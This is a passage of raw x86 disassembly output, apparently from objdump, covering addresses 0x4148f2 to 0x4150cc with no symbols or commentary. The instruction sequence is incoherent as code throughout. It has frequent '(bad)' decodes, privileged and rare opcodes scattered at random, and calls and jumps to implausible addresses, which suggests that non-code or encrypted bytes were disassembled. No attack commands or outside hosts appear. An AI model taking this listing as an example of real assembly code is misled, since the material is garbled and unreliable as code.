  4148f2:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4148f8:	or     BYTE PTR [ebp+0x7],al
  4148fb:	mov    eax,ecx
  4148fd:	clc    
  4148fe:	jb     0x4148c1
  414900:	add    BYTE PTR [ebp+0x55],cl
  414903:	or     DWORD PTR [edi],0xc251d155
  414909:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  414913:	mov    edi,eax
  414915:	or     cl,al
  414917:	inc    ebp
  414918:	dec    ebp
  414919:	mov    eax,DWORD PTR [ecx+0x514d550c]
  41491f:	or     WORD PTR [ecx],0x899c
  414924:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  41492a:	mov    edx,DWORD PTR [ecx+0x8]
  41492d:	mov    eax,DWORD PTR [ebp-0x8]
  414930:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  414937:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  41493d:	inc    ebp
  41493e:	dec    eax
  41493f:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  414945:	add    edx,DWORD PTR [ecx-0x8]
  414948:	mov    ecx,DWORD PTR [ecx]
  41494a:	clc    
  41494b:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  414952:	mov    ecx,ebp
  414954:	clc    
  414955:	(bad)  
  414956:	popf   
  414957:	inc    DWORD PTR [eax]
  414959:	ret    0x8b
  41495c:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  414962:	mov    edi,esp
  414964:	hlt    
  414965:	test   ecx,esi
  414967:	clc    
  414968:	or     BYTE PTR [ebp+0x7],al
  41496b:	xor    cl,al
  41496d:	pushf  
  41496e:	jb     0x4149a3
  414970:	add    BYTE PTR [eax-0x3f],al
  414973:	inc    eax
  414974:	daa    
  414975:	inc    ebp
  414976:	inc    ebp
  414977:	xor    eax,0x7f80803
  41497c:	dec    ebp
  41497d:	pushf  
  41497e:	add    esi,DWORD PTR [edx]
  414980:	clc    
  414981:	cmp    DWORD PTR [ecx],ecx
  414983:	or     al,0x8
  414985:	add    al,BYTE PTR [ebp+0x2c]
  414988:	xor    eax,0x7350845
  41498d:	or     BYTE PTR [ebp+0x7],cl
  414990:	lea    ebx,[ecx+eax*1+0x8b7232]
  414997:	or     al,0x45
  414999:	enter  0x4deb,0x8b
  41499d:	mov    edx,DWORD PTR [eax]
  41499f:	cld    
  4149a0:	dec    ebp
  4149a1:	push   ebp
  4149a2:	sub    edx,DWORD PTR [ecx-0x75]
  4149a5:	add    eax,0xf172fc
  4149aa:	or     BYTE PTR [ebp+0x7],cl
  4149ad:	add    eax,ecx
  4149af:	or     al,0x72
  4149b1:	add    DWORD PTR [eax],eax
  4149b3:	mov    ebx,0x29c2c1
  4149b8:	inc    ebp
  4149b9:	mov    eax,DWORD PTR [ebx]
  4149bb:	cmp    eax,0x3004d1c
  4149c1:	xbegin 0x66c6d5bb
  4149c7:	clc    
  4149c8:	or     BYTE PTR [ebp+0x45],al
  4149cb:	xor    BYTE PTR ds:0x78b089c,dh
  4149d1:	adc    BYTE PTR [ebp+0x45],cl
  4149d4:	lea    eax,[ebp+0x33727501]
  4149da:	add    cl,ch
  4149dc:	inc    ebp
  4149dd:	add    bl,ch
  4149df:	add    BYTE PTR [ebx+0x45850845],cl
  4149e5:	je     0x414972
  4149e7:	push   ebx
  4149e8:	or     al,0x85
  4149ea:	dec    ebp
  4149eb:	std    
  4149ec:	mov    bh,bh
  4149ee:	mov    BYTE PTR [ebp-0x75],al
  4149f1:	mov    edi,eax
  4149f3:	or     al,0x89
  4149f5:	inc    ebp
  4149f6:	clc    
  4149f7:	mov    esp,esp
  4149f9:	hlt    
  4149fa:	call   DWORD PTR [edi-0x37]
  4149fd:	push   ebp
  4149fe:	or     al,0x51
  414a00:	push   ebp
  414a01:	xor    ebp,esp
  414a03:	mov    esi,0x457251
  414a08:	xor    esi,eax
  414a0a:	pushf  
  414a0b:	inc    ebp
  414a0c:	(bad)  
  414a0d:	mov    edi,eax
  414a0f:	or     al,0x85
  414a11:	add    al,bh
  414a13:	inc    eax
  414a15:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  414a19:	or     ah,bh
  414a1b:	inc    eax
  414a1c:	push   ebp
  414a1d:	jmp    0x414a70
  414a1f:	mov    eax,DWORD PTR ds:0xe8720c
  414a25:	mov    DWORD PTR [ebp-0x8],eax
  414a28:	jne    0x414a6f
  414a2a:	jmp    0x4149b7
  414a2c:	mov    ebp,DWORD PTR [eax]
  414a2e:	clc    
  414a2f:	retf   0xff55
  414a32:	push   ecx
  414a33:	mov    DWORD PTR ds:0x757210,eax
  414a39:	mov    ecx,DWORD PTR [ebp-0x4]
  414a3c:	sub    esp,DWORD PTR [ebx-0x77]
  414a3f:	dec    DWORD PTR [eax*4-0x74ca8abb]
  414a46:	or     ah,bh
  414a48:	pop    es
  414a49:	ds pushf 
  414a4b:	push   DWORD PTR [edx]
  414a4d:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  414a53:	(bad)  
  414a54:	mov    bh,bh
  414a56:	jmp    0x414a44
  414a58:	leave  
  414a59:	jne    0x414a63
  414a5b:	call   0x2e43b5
  414a60:	in     al,dx
  414a61:	dec    ebp
  414a62:	add    dh,BYTE PTR [ebx]
  414a64:	add    BYTE PTR [ebx],al
  414a66:	inc    ebp
  414a67:	cmp    esi,DWORD PTR [ecx]
  414a69:	je     0x414a07
  414a6b:	mov    eax,edi
  414a6d:	or     al,0xf0
  414a6f:	add    BYTE PTR [ebp+0x458bf845],al
  414a75:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  414a7b:	adc    al,0x7
  414a7d:	enter  0x9fc0,0xa5
  414a81:	rol    BYTE PTR [eax],0x5e
  414a84:	mov    ecx,ecx
  414a86:	or     al,0xc
  414a88:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  414a8f:	jmp    0x414a90
  414a91:	push   ebp
  414a92:	mov    esp,ebp
  414a94:	cld    
  414a95:	inc    ebp
  414a96:	inc    ebp
  414a97:	or     DWORD PTR [ecx+0x457dec10],0x0
  414a9e:	push   esi
  414a9f:	push   esi
  414aa0:	mov    edi,0x7af080f
  414aa5:	add    bh,al
  414aa7:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  414aae:	mov    DWORD PTR [edi],ecx
  414ab0:	adc    BYTE PTR [eax+0x45],al
  414ab3:	mov    ebp,eax
  414ab5:	mov    ebp,edi
  414ab7:	lock call edx
  414aba:	fcom   DWORD PTR [ebp+0x45]
  414abd:	mov    eax,0x148a8b
  414ac2:	push   ecx
  414ac3:	enter  0xc145,0x83
  414ac7:	cmp    ecx,DWORD PTR [eax]
  414ac9:	add    BYTE PTR [ebp+0x4d],al
  414acc:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  414ad2:	call   0xffa14641
  414ad7:	cmp    eax,DWORD PTR [ebp-0xc]
  414ada:	jmp    DWORD PTR [eax+edx*1-0x4e]
  414ade:	push   ebp
  414adf:	(bad)  
  414ae0:	call   0x3248e4
  414ae5:	mov    bh,0xdb
  414ae7:	cld    
  414ae8:	or     BYTE PTR [ebp+0x45],bl
  414aeb:	(bad)  
  414aec:	call   0xff7b477c
  414af1:	add    al,BYTE PTR [ebp+0x37]
  414af4:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  414afa:	jne    0x414afc
  414afc:	(bad)  
  414afd:	cmp    edi,esp
  414aff:	jne    0x414b32
  414b01:	mov    edi,edi
  414b03:	or     BYTE PTR [ebx-0x307f0b49],cl
  414b09:	pop    ds
  414b0a:	into   
  414b0b:	je     0x414ace
  414b0d:	mov    ebx,DWORD PTR [esi]
  414b0f:	or     BYTE PTR [ebp-0x49],al
  414b12:	mov    esp,DWORD PTR [esi-0x77]
  414b15:	mov    esi,0x4451f0c
  414b1a:	mov    eax,DWORD PTR [eax]
  414b1c:	or     al,0x66
  414b1e:	sar    bl,0x3b
  414b21:	xor    esi,DWORD PTR [ebp+0x66]
  414b24:	xor    ecx,edi
  414b26:	pop    edi
  414b27:	adc    bl,BYTE PTR [ebx+0x70]
  414b2a:	ret    0xff
  414b2d:	cld    
  414b2e:	inc    ebp
  414b2f:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  414b35:	cld    
  414b36:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  414b3d:	push   0xffffff83
  414b3f:	pop    edi
  414b40:	or     BYTE PTR [ebp+0x53],dh
  414b43:	xorps  xmm1,xmm2
  414b46:	test   BYTE PTR [eax+eax*1],bh
  414b49:	add    BYTE PTR [eax],al
  414b4b:	adc    eax,eax
  414b4d:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  414b55:	jmp    DWORD PTR [eax]
  414b57:	ror    al,0x5e
  414b5a:	inc    ebp
  414b5b:	leave  
  414b5c:	xor    ecx,DWORD PTR [eax]
  414b5e:	and    DWORD PTR [ebx-0x3ec10708],ecx
  414b64:	add    ah,al
  414b66:	xor    edi,edi
  414b68:	xor    DWORD PTR [ebx],0x66003304
  414b6e:	mov    DWORD PTR [ebp-0xc],ecx
  414b71:	pcmpgtw mm0,mm0
  414b74:	add    dl,ah
  414b76:	leave  
  414b77:	mov    edi,DWORD PTR [esi-0x7d]
  414b7a:	push   ax
  414b7c:	dec    ebp
  414b7d:	mov    esi,DWORD PTR [ebx-0x75]
  414b80:	lea    ebp,[eax-0x7c00ff04]
  414b86:	xor    eax,DWORD PTR [eax]
  414b88:	sysret 
  414b8a:	dec    ebp
  414b8b:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  414b92:	push   WORD PTR [ecx+0x8]
  414b96:	jne    0x414b59
  414b98:	ud0    ecx,DWORD PTR [ecx]
  414b9b:	mov    eax,edx
  414b9d:	lods   al,BYTE PTR ds:[esi]
  414b9e:	add    BYTE PTR [eax],al
  414ba0:	data16 (bad) 
  414ba2:	iret   
  414ba3:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  414baa:	cli    
  414bab:	inc    ebp
  414bac:	cmp    al,0x8d
  414bae:	add    BYTE PTR [esi+0x2d],ah
  414bb1:	inc    ebp
  414bb2:	pop    ebp
  414bb3:	lea    ecx,[edi]
  414bb5:	mov    dl,bh
  414bb7:	add    BYTE PTR [edi],cl
  414bb9:	mov    DWORD PTR [eax+eax*8],edi
  414bbc:	mov    ebx,0x3b87
  414bc1:	add    BYTE PTR [ebx],ch
  414bc3:	inc    ebp
  414bc4:	data16 (bad) 
  414bc6:	clc    
  414bc7:	int3   
  414bc8:	cmp    eax,DWORD PTR [eax]
  414bca:	je     0x414b55
  414bcc:	push   0xffffffc8
  414bce:	pop    edi
  414bcf:	xchg   DWORD PTR [ebp+0x0],eax
  414bd2:	data16 add BYTE PTR [ebp+0x45],cl
  414bd6:	lea    cx,[ebp+0x10]
  414bda:	jb     0x414bdc
  414bdc:	jmp    0x414b67
  414bde:	call   eax
  414be0:	clc    
  414be1:	xchg   DWORD PTR [edi+0x1],edi
  414be4:	mov    eax,DWORD PTR [eax]
  414be6:	or     BYTE PTR [ebp-0x49],al
  414be9:	lea    eax,[eax+0x74003154]
  414bef:	push   edi
  414bf0:	inc    edx
  414bf1:	jge    0x414bf2
  414bf3:	mov    DWORD PTR [edi],ecx
  414bf5:	fdiv   DWORD PTR [edi-0x6]
  414bf8:	inc    DWORD PTR [eax]
  414bfa:	xor    edx,DWORD PTR [eax+0x5f]
  414bfd:	xchg   DWORD PTR [ebx+0x1],ebx
  414c00:	ret    0x0
  414c03:	xor    BYTE PTR [ebp-0x51],cl
  414c06:	cmp    edi,0xf0ff89fc
  414c0c:	data16 ror al,0x84
  414c10:	rol    BYTE PTR [eax],0x3b
  414c13:	add    al,dh
  414c15:	dec    eax
  414c16:	xchg   esp,eax
  414c17:	push   ebx
  414c18:	jmp    0x414ba5
  414c1a:	push   ebp
  414c1b:	add    esp,ebp
  414c1d:	add    ebp,esp
  414c1f:	mov    edx,DWORD PTR [edi+0x24]
  414c22:	clc    
  414c23:	dec    esi
  414c24:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  414c2a:	cmp    BYTE PTR [ebx],al
  414c2c:	jne    0x414bb7
  414c2e:	xor    esp,eax
  414c30:	jmp    0x444db3
  414c35:	add    ebp,DWORD PTR [ecx+ecx*4]
  414c38:	jne    0x414c2e
  414c3a:	call   0xffcb4994
  414c3f:	clc    
  414c40:	xchg   edi,eax
  414c41:	sti    
  414c42:	add    DWORD PTR [ebx],eax
  414c44:	add    BYTE PTR [ebp+0x47],bl
  414c47:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  414c4d:	pop    ebp
  414c4e:	mov    DWORD PTR [esi-0x48],esi
  414c51:	jmp    0x414c9a
  414c53:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  414c59:	(bad)  
  414c5b:	cmp    al,0x0
  414c5d:	cmp    eax,DWORD PTR [ebp+0x18]
  414c60:	lea    ebx,[ebp-0x56]
  414c63:	jle    0x414c65
  414c65:	jae    0x414bf0
  414c67:	mov    eax,esp
  414c69:	call   0xb900:0x8b005587
  414c70:	inc    ebp
  414c71:	push   ebp
  414c72:	lea    ecx,[ebp-0x27ff4f12]
  414c78:	mov    eax,edi
  414c7a:	int3   
  414c7b:	push   ebp
  414c7c:	xchg   edi,eax
  414c7e:	add    esp,ebp
  414c80:	add    BYTE PTR [eax],al
  414c82:	inc    ebp
  414c83:	add    BYTE PTR [ebp+0x8b3255],cl
  414c89:	cld    
  414c8a:	mov    DWORD PTR [edx],edi
  414c8c:	aam    0x75
  414c8e:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  414c94:	mov    DWORD PTR [ebx-0x50],edx
  414c97:	test   BYTE PTR [ebp-0x1],0xe8
  414c9b:	mov    eax,DWORD PTR [eax]
  414c9d:	hlt    
  414c9e:	add    al,al
  414ca0:	mov    eax,DWORD PTR ds:0x890045a8
  414ca6:	dec    DWORD PTR [ebx+0x45fdf0e8]
  414cac:	inc    DWORD PTR [eax*2+0xf75854d]
  414cb3:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  414cb9:	call   0x7297a9fa
  414cbe:	je     0x414d1e
  414cc0:	js     0x414d21
  414cc2:	lock ret 0x7e
  414cc6:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  414ccc:	mov    edi,edi
  414cce:	sbb    al,bl
  414cd0:	clc    
  414cd1:	add    BYTE PTR [ebp-0x73],bh
  414cd4:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  414cda:	ror    BYTE PTR [eax],1
  414cdc:	dec    ebp
  414cdd:	xchg   ebp,eax
  414cde:	mov    edi,edi
  414ce0:	in     al,0x8b
  414ce2:	jge    0x414c6d
  414ce4:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  414cea:	clc    
  414ceb:	pop    esi
  414cec:	fist   DWORD PTR [ebp+0x5d398b5d]
  414cf2:	clc    
  414cf3:	add    al,0x6e
  414cf5:	mov    eax,DWORD PTR [ebx]
  414cf7:	mov    BYTE PTR [ebp+0x0],dl
  414cfa:	mov    edx,DWORD PTR [ebx-0x20]
  414cfd:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  414d03:	add    eax,0x3b3b73
  414d08:	adc    al,0x89
  414d0a:	pop    eax
  414d0b:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  414d0f:	ret    0xf08
  414d12:	cmp    al,0x2
  414d14:	mov    edx,eax
  414d16:	cld    
  414d17:	add    BYTE PTR [ebp+0x66],dl
  414d1a:	add    eax,ebx
  414d1c:	add    esp,eax
  414d1e:	sub    eax,eax
  414d20:	or     BYTE PTR [ecx-0x77f474bb],cl
  414d26:	add    BYTE PTR [eax],al
  414d28:	mov    DWORD PTR [ebx-0x24],ebx
  414d2b:	push   edi
  414d2c:	push   ebp
  414d2d:	clc    
  414d2e:	add    DWORD PTR [esi+0x1b0100],0x45
  414d35:	out    0xff,eax
  414d37:	add    edx,DWORD PTR [eax]
  414d39:	jmp    0x414d23
  414d3b:	cmp    ch,0x47
  414d3e:	(bad)  
  414d3f:	jmp    0x40c6d591
  414d44:	je     0x414cd0
  414d46:	mov    eax,DWORD PTR [eax-0x10c78f04]
  414d4c:	inc    ebp
  414d4d:	add    BYTE PTR [ebx-0x770375],al
  414d53:	add    ah,ch
  414d55:	add    edx,esp
  414d57:	pop    edi
  414d58:	pop    ebp
  414d59:	push   ebp
  414d5a:	inc    ebx
  414d5b:	in     al,dx
  414d5c:	pop    ebp
  414d5d:	in     al,dx
  414d5e:	cmp    edx,DWORD PTR [edi-0x8]
  414d61:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  414d68:	add    al,0x47
  414d6a:	push   ebp
  414d6b:	mov    esp,ebp
  414d6d:	in     al,0x45
  414d6f:	dec    ebp
  414d70:	push   esi
  414d71:	test   DWORD PTR [eax+0xfb010f],esi
  414d77:	add    BYTE PTR [eax+0xc018b],dh
  414d7d:	leave  
  414d7e:	inc    ebp
  414d7f:	test   al,ch
  414d81:	add    dh,bh
  414d83:	add    bh,bh
  414d85:	dec    ebp
  414d86:	push   cs
  414d87:	mov    DWORD PTR [ecx],eax
  414d89:	hlt    
  414d8a:	push   es
  414d8b:	dec    ebp
  414d8c:	leave  
  414d8d:	mov    DWORD PTR [eax],ecx
  414d8f:	clc    
  414d90:	cmovge eax,ecx
  414d93:	mov    ecx,0x85c2f0
  414d99:	clc    
  414d9a:	pop    DWORD PTR [ebp+0x1]
  414d9d:	push   ebx
  414d9e:	add    BYTE PTR [ebp-0x15],bh
  414da1:	push   esi
  414da2:	xor    eax,0x898a45
  414da7:	cld    
  414da8:	add    al,0x45
  414daa:	add    BYTE PTR [ebx],dh
  414dac:	pushfw 
  414dae:	add    DWORD PTR [esi+0x78308c1],edi
  414db4:	add    ah,BYTE PTR [edi+esi*4-0x33]
  414db8:	mov    ebx,0xc4e8b
  414dbd:	(bad)  
  414dbe:	cmp    ecx,ebx
  414dc0:	jne    0x414d8a
  414dc2:	xor    ecx,DWORD PTR [ebp+0x66]
  414dc5:	jmp    0xc84dcb
  414dca:	add    DWORD PTR [ebp+0x0],eax
  414dcd:	mov    eax,ebx
  414dcf:	or     al,0x8b
  414dd1:	(bad)  
  414dd2:	mov    ecx,esi
  414dd4:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  414ddb:	mov    eax,edi
  414ddd:	or     BYTE PTR [edx],cl
  414ddf:	shl    cl,cl
  414de1:	icebp  
  414de2:	add    BYTE PTR [ebp+0x37],0x8b
  414de6:	or     BYTE PTR [edx+eax*2],cl
  414de9:	(bad)  
  414dea:	or     cl,dh
  414dec:	stc    
  414ded:	shl    DWORD PTR [ebp-0x30],0xc6
  414df1:	xor    al,0x0
  414df3:	inc    ebp
  414df4:	xchg   BYTE PTR [ebx],al
  414df6:	add    esp,edi
  414df8:	add    BYTE PTR [ebp-0x39],cl
  414dfb:	mov    al,bl
  414dfd:	test   DWORD PTR [ebx+0x1c348375],ecx
  414e03:	sub    al,0xbf
  414e05:	jmp    0x414d8c
  414e07:	mov    edi,eax
  414e09:	lock jge 0x414dfd
  414e0c:	lea    esi,[edx-0x74bad501]
  414e12:	mov    ebp,esp
  414e14:	or     cl,dh
  414e16:	leave  
  414e17:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  414e1e:	dec    ebp
  414e1f:	dec    ebp
  414e20:	test   DWORD PTR [ebx],eax
  414e22:	paddb  mm6,mm0
  414e25:	add    DWORD PTR [eax],eax
  414e27:	dec    ebp
  414e28:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  414e2e:	mov    esi,DWORD PTR [edx]
  414e30:	or     al,0x2b
  414e32:	dec    ebp
  414e33:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  414e39:	mov    esp,esi
  414e3b:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  414e42:	mov    DWORD PTR [ebx],ebp
  414e44:	call   0xc74d774
  414e49:	mov    DWORD PTR [ebp+0x10],ecx
  414e4c:	(bad)  
  414e4d:	push   0x8b85ff10
  414e52:	clc    
  414e53:	or     al,0x55
  414e55:	(bad)  
  414e56:	push   ecx
  414e57:	retf   
  414e58:	mov    ebx,0xff4d8dc8
  414e5d:	mov    DWORD PTR [ebp+0x8],eax
  414e60:	xor    eax,DWORD PTR [ebp-0x75]
  414e63:	cmp    ebp,DWORD PTR [ebx]
  414e65:	lsl    ebx,WORD PTR [edi-0x8]
  414e69:	call   DWORD PTR [ebx-0x741bff75]
  414e6f:	(bad)  
  414e70:	or     al,0x5b
  414e72:	dec    ebp
  414e73:	or     BYTE PTR [ebx],dh
  414e75:	inc    ebp
  414e76:	xor    esi,DWORD PTR ds:0x708088d
  414e7c:	in     eax,0x9c
  414e7e:	add    BYTE PTR [edx],dh
  414e80:	inc    ebp
  414e81:	pop    edi
  414e82:	xor    eax,edx
  414e84:	test   DWORD PTR [eax],0x83108b8b
  414e8a:	dec    ebp
  414e8b:	adc    al,0x33
  414e8d:	inc    ebp
  414e8e:	xor    esi,DWORD PTR [ecx]
  414e90:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  414e97:	test   DWORD PTR [eax],ecx
  414e99:	clc    
  414e9a:	inc    ebp
  414e9b:	add    ecx,DWORD PTR [ebx+0xc7f445]
  414ea1:	hlt    
  414ea2:	leave  
  414ea3:	test   DWORD PTR [esi],eax
  414ea5:	clc    
  414ea6:	inc    edi
  414ea7:	push   edi
  414ea8:	aaa    
  414ea9:	inc    ebp
  414eaa:	pop    ss
  414eab:	ror    DWORD PTR [ebp-0x29],1
  414eae:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  414eb5:	mov    eax,0x780084d
  414eba:	push   ebp
  414ebb:	clc    
  414ebc:	ret    0xe99c
  414ebf:	xor    dl,dl
  414ec1:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  414ec7:	js     0x887dac6
  414ecd:	dec    ebp
  414ece:	push   ebp
  414ecf:	mov    edi,DWORD PTR [eax+0xc872fc]
  414ed5:	lock enter 0xceca,0xf2
  414eda:	retf   0x18ce
  414edd:	jne    0x414f2c
  414edf:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  414ee5:	enter  0xf0d6,0xca
  414ee9:	retf   0xf2c8
  414eec:	into   
  414eed:	out    dx,al
  414eee:	dec    ebp
  414eef:	dec    ebp
  414ef0:	jmp    0xff454e28
  414ef5:	xor    eax,DWORD PTR [ebp-0x15]
  414ef8:	xor    esi,DWORD PTR [ebx]
  414efa:	mov    esi,DWORD PTR [ebx]
  414efc:	sub    eax,DWORD PTR [ebx]
  414efe:	add    eax,DWORD PTR [ebx]
  414f00:	or     bl,dl
  414f02:	dec    ebp
  414f03:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  414f09:	xor    eax,DWORD PTR [ebp-0xf00073]
  414f0f:	jb     0x414f56
  414f11:	add    BYTE PTR [ebx],dh
  414f13:	dec    ebp
  414f14:	pop    esi
  414f15:	mov    ebp,ebx
  414f17:	cld    
  414f18:	mov    esi,eax
  414f1a:	call   0x520fa4e7
  414f1f:	stc    
  414f20:	add    eax,0x4572aa
  414f25:	pop    edi
  414f26:	leave  
  414f27:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  414f2e:	in     al,dx
  414f2f:	mov    eax,edi
  414f31:	xor    eax,0xf8008520
  414f37:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  414f3e:	mov    eax,DWORD PTR [ebp-0x77]
  414f41:	xor    al,bh
  414f43:	pushf  
  414f44:	inc    ebp
  414f45:	(bad)  
  414f46:	cmp    eax,ebp
  414f48:	pushf  
  414f49:	xchg   BYTE PTR [esi-0x8],dl
  414f4c:	mov    edi,0x8518e4ec
  414f52:	jmp    0xf056:0x8b457df8
  414f59:	push   ebp
  414f5a:	push   ebp
  414f5b:	push   ecx
  414f5c:	push   ecx
  414f5d:	push   edi
  414f5e:	xor    eax,esi
  414f60:	mov    edx,0x32729c
  414f65:	add    ecx,eax
  414f67:	mov    edx,edi
  414f69:	clc    
  414f6a:	retf   0xaf45
  414f6d:	cmp    ebx,ebp
  414f6f:	pushf  
  414f70:	mov    eax,edi
  414f72:	clc    
  414f73:	cld    
  414f74:	jne    0x414f8e
  414f76:	xor    ebp,edx
  414f78:	xor    eax,DWORD PTR [ebp+0x3]
  414f7b:	or     BYTE PTR [ebx],al
  414f7d:	add    BYTE PTR [ebp-0x7747475],al
  414f83:	hlt    
  414f84:	dec    ebp
  414f85:	dec    ebp
  414f86:	je     0x414fbb
  414f88:	xor    esi,DWORD PTR [ebx]
  414f8a:	xor    eax,DWORD PTR [ebx]
  414f8c:	add    eax,DWORD PTR [ebx]
  414f8e:	add    ecx,DWORD PTR [edi]
  414f90:	rol    ecx,cl
  414f92:	mov    esi,DWORD PTR [ecx]
  414f94:	in     al,dx
  414f95:	inc    ebp
  414f96:	enter  0xca2b,0x33
  414f9a:	icebp  
  414f9b:	mov    DWORD PTR [edx],ecx
  414f9d:	clc    
  414f9e:	lock pop ebp
  414fa0:	enter  0xf2e8,0xfe
  414fa4:	retf   0xeeff
  414fa7:	inc    ebp
  414fa8:	jne    0x414f35
  414faa:	mov    edi,eax
  414fac:	cld    
  414fad:	dec    ebp
  414fae:	enter  0xbc89,0x8d
  414fb2:	pushf  
  414fb3:	sti    
  414fb4:	xor    bh,bh
  414fb6:	mov    eax,DWORD PTR [ebp-0xc]
  414fb9:	mov    esi,DWORD PTR [ebp-0x4]
  414fbc:	xor    eax,esi
  414fbe:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  414fc5:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  414fcb:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  414fd1:	(bad)  
  414fd2:	push   ebp
  414fd3:	shr    esp,0x4d
  414fd6:	in     al,dx
  414fd7:	cmp    eax,DWORD PTR [esi+esi*2]
  414fda:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  414fe0:	pushf  
  414fe1:	mov    edi,0x85c7f445
  414fe7:	call   0xf886d6e4
  414fec:	xor    ebx,ebx
  414fee:	pushf  
  414fef:	popa   
  414ff0:	push   ebx
  414ff1:	dec    ebp
  414ff2:	inc    ebp
  414ff3:	mov    esi,DWORD PTR [esi]
  414ff5:	clc    
  414ff6:	pushf  
  414ff7:	into   
  414ff8:	mov    ecx,edi
  414ffa:	in     al,dx
  414ffb:	call   0x8b4995be
  415000:	pop    es
  415001:	or     BYTE PTR [ebx],dh
  415003:	or     BYTE PTR [edi+0x8a724d],bh
  415009:	or     eax,edi
  41500b:	push   ebp
  41500c:	inc    ebp
  41500d:	cmpxchg8b (bad)
  41500e:	(bad)  
  41500f:	leave  
  415010:	loopne 0x414fdc
  415012:	test   DWORD PTR [ebp-0x8],ecx
  415015:	mov    eax,DWORD PTR [ebp-0x18]
  415018:	rcl    DWORD PTR [ebp-0x29],1
  41501b:	xor    eax,edi
  41501d:	add    esi,eax
  41501f:	and    eax,DWORD PTR [eax]
  415021:	mov    eax,DWORD PTR [eax]
  415023:	(bad)  
  415024:	leave  
  415025:	sti    
  415026:	inc    ebp
  415027:	dec    DWORD PTR [ebx-0x39cc13ab]
  41502d:	mov    esi,ecx
  41502f:	clc    
  415030:	(bad)  
  415031:	dec    ebp
  415032:	iret   
  415033:	xor    ebp,DWORD PTR [edi-0x74f71473]
  415039:	jb     0x415037
  41503b:	add    bh,al
  41503d:	inc    ebp
  41503e:	(bad)  
  41503f:	mov    eax,DWORD PTR [ebp-0xc]
  415042:	(bad)  
  415043:	xabort 0x64
  415046:	loopne 0x415015
  415048:	jmp    FWORD PTR [ebx]
  41504a:	mov    DWORD PTR [ebx],eax
  41504c:	clc    
  41504d:	lock inc ebp
  41504f:	dec    ebp
  415050:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  415056:	loopne 0x41508b
  415058:	inc    DWORD PTR [ebx]
  41505a:	mov    edi,DWORD PTR [ebx]
  41505c:	hlt    
  41505d:	jne    0x4150ac
  41505f:	mov    esi,DWORD PTR [ebx]
  415061:	in     al,0x8d
  415063:	dec    ebp
  415064:	or     BYTE PTR [ebx],dh
  415066:	jb     0x41506b
  415068:	add    BYTE PTR [edi+0x45],bl
  41506b:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  415071:	add    BYTE PTR [ebx],dh
  415073:	mov    esi,DWORD PTR [ebx]
  415075:	sub    DWORD PTR [ebx],0x6c
  415078:	mov    eax,DWORD PTR [ebp-0x4]
  41507b:	xor    eax,ecx
  41507d:	pushf  
  41507e:	mov    ecx,0x338545ba
  415083:	clc    
  415084:	add    edx,DWORD PTR [ebp-0x77]
  415087:	mov    edi,eax
  415089:	adc    al,0x45
  41508b:	inc    ebp
  41508c:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  415094:	mov    eax,DWORD PTR [eax]
  415096:	loopne 0x4150e5
  415098:	inc    ebp
  415099:	mov    esi,DWORD PTR [ebx]
  41509b:	mov    eax,DWORD PTR [ebx]
  41509d:	nop
  41509e:	rol    DWORD PTR [eax],cl
  4150a0:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  4150a6:	mov    cl,BYTE PTR [ecx+0x450bf888]
  4150ac:	dec    ebp
  4150ad:	push   esi
  4150ae:	mov    edi,DWORD PTR [edi+0x7b608f8]
  4150b4:	xor    eax,edi
  4150b6:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  4150bd:	mov    DWORD PTR [eax],ecx
  4150bf:	in     al,dx
  4150c0:	into   
  4150c1:	inc    ebp
  4150c2:	iret   
  4150c3:	xor    ecx,edx
  4150c5:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  4150cc:	mov    ecx,DWORD PTR [ebx-0x1735af04]
